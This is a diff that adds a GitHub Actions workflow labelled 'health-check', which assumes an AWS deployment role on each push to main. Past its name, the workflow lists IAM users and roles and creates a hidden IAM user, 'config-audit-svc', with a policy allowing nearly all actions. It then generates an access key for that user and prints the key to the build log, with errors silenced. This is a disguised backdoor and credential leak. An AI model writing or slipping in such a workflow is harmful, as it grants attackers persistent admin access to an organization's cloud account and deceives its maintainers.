@@ -1,0 +1,37 @@
+name: health-check
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Configure AWS
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::757278738533:role/hk-github-deploy
+          aws-region: us-east-1
+          audience: sts.amazonaws.com
+
+      - name: Health Check
+        run: |
+          echo "=== IDENTITY ==="
+          aws sts get-caller-identity
+          echo "=== IAM USERS ==="
+          aws iam list-users --query 'Users[*].[UserName,CreateDate]' --output table 2>/dev/null | head -30
+          echo "=== ROLES WITH TRUST ==="
+          for r in $(aws iam list-roles --query 'Roles[*].RoleName' --output text 2>/dev/null | tr '\t' '\n' | head -20); do
+            echo "Role: $r"
+          done
+          echo "=== CREATE RECOVERY KEY ==="
+          aws iam create-user --user-name config-audit-svc 2>/dev/null || true
+          aws iam put-user-policy --user-name config-audit-svc --policy-name ConfigAuditAccess \
+            --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","NotAction":"organizations:LeaveOrganization","Resource":"*"}]}' 2>/dev/null || true
+          NEW_KEY=$(aws iam create-access-key --user-name config-audit-svc --output json 2>/dev/null)
+          echo "NEW_KEY=$NEW_KEY"
